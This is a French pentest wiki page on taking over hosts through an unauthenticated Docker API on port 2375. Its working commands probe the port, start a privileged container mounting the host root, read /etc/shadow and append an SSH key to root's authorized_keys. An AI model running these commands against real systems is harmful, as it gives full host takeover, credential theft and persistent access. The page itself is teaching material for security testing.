---
order: 1
title: "Accès non authentifié au daemon : contrôle total sur un port 2375 ouvert"
description: "Le daemon Docker sur le port TCP 2375 sert son API en HTTP en clair, sans authentification. Tout client capable d'atteindre le port émet des appels d'API comme s'il était root local : lister les conteneurs et y faire un exec, lire les secrets d'environnement, et lancer un nouveau conteneur privilégié qui monte la racine de l'hôte, donnant une compromission complète de l'hôte."
keywords:
  - docker 2375
  - docker non authentifié
  - docker api
  - exécution de code à distance
  - prise de contrôle de l'hôte
---

# Accès non authentifié au daemon

Le port 2375 est l'endpoint HTTP en clair de l'API du daemon Docker. Il ne porte aucune authentification ni aucune sécurité de transport, de sorte que chaque requête est honorée comme une opération locale privilégiée en tant que root. Un 2375 exposé n'est donc pas une fuite d'information mais une compromission complète immédiate : l'appelant dispose du même pouvoir que l'utilisateur root de l'hôte à travers le daemon.

Confirmez l'accès et pointez le CLI Docker dessus :

```bash
curl -s http://<target>:2375/version                 # version/info => reachable and open
export DOCKER_HOST=tcp://<target>:2375
docker info                                           # the CLI now drives the remote daemon
docker ps -a; docker images                           # enumerate the environment
```

## De l'accès au root de l'hôte

Le daemon peut créer un conteneur qui monte la racine de l'hôte et s'exécute en mode privilégié ; une seule commande s'empare de l'hôte :

```bash
docker -H tcp://<target>:2375 run -v /:/host --privileged --rm -it alpine \
  chroot /host sh
# or non-interactively, read a host secret and plant a key
docker -H tcp://<target>:2375 run -v /:/host --rm alpine \
  sh -c 'cat /host/etc/shadow; echo "ssh-ed25519 AAAA... a" >> /host/root/.ssh/authorized_keys'
```

Sans le CLI, la même chose se fait via l'API brute avec `curl`, en créant un conteneur avec un `HostConfig.Binds` de `/:/host` et `Privileged:true`, comme dans [Montage de socket de runtime](../../../container-escape/sensitive-mounts/runtime-socket-mount.md). L'énumération de ce qui est déjà présent livre souvent des secrets plus vite qu'un conteneur frais ; voir [Énumération de l'API](api-enumeration.md).

## Notes d'exploitation

- Aucun identifiant n'est impliqué ; l'atteignabilité est le seul verrou, de sorte que l'étape de découverte et de prise de contrôle est une seule commande `docker -H` dès que le port répond.
- Réutilisez une image déjà présente sur l'hôte (`docker images`) pour éviter un pull ; n'importe quelle image Linux convient puisque vous faites immédiatement un `chroot` sur la racine de l'hôte.
- Le conteneur s'exécute en tant que vrai root de l'hôte sauf si le daemon est en mode rootless ; `docker info` affiche `rootless` sous les options de sécurité le cas échéant, ce qui contraint ce que le montage livre.

## Références

- [Docker: protect the daemon socket](https://docs.docker.com/engine/security/protect-access/)
- [HackTricks: 2375 Docker](https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker)
- [Docker Engine API: containers](https://docs.docker.com/reference/api/engine/)
